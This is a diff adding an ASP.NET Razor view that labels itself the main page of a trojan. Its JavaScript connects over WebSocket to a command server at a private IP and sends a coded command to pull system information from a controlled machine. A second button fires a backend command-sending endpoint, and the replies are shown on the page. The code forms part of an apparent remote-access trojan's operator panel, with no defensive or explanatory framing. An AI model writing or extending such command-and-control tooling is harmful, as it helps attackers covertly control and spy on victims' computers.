@@ -1,0 +1,49 @@
+﻿@{
+    ViewBag.Title = "系统信息";
+}
+
+<h2>木马的主页面</h2>
+<script type="text/javascript">
+    var state = false;
+    $(document).ready(function () {
+        ws = new WebSocket("ws://192.168.11.234:2012/");//连接服务器
+        ws.onopen = function (event) {
+            state = true;
+        };
+        ws.onmessage = function (event) {
+            $("#systeminfo").append("<div>\r\n" + event.data + "</div><br/>");
+        };
+        ws.onclose = function (event) {
+            $("#connectState").append("<div>已经与服务器断开连接\r\n当前连接状态：" + this.readyState + "</div><br/>");
+        };
+        ws.onerror = function (event) {
+            state = false;
+        };
+    });
+
+    function sendData()
+    {
+        var tmark=@{ @ViewData["tmark"].ToString();}
+        ws.send("01|" + tmark + "|01");
+    }
+
+    function simulation()
+    {
+        $.ajax({
+            url: "../SendOrderByWebSocketServer",
+            type: "Get",
+            success: function (data) {
+                //$("#systeminfo").text(data);
+            },
+            error: function () {
+
+                alert("通讯出错");
+            }
+
+        });
+    }
+</script>
+<input type="button" id="btn_GetSystem" value="获取系统信息" onclick="sendData()" />
+
+<input type="button" id="btn_Send" value="模拟触发后台发送事件" onclick="simulation()" /> 
+<div id="systeminfo"></div>
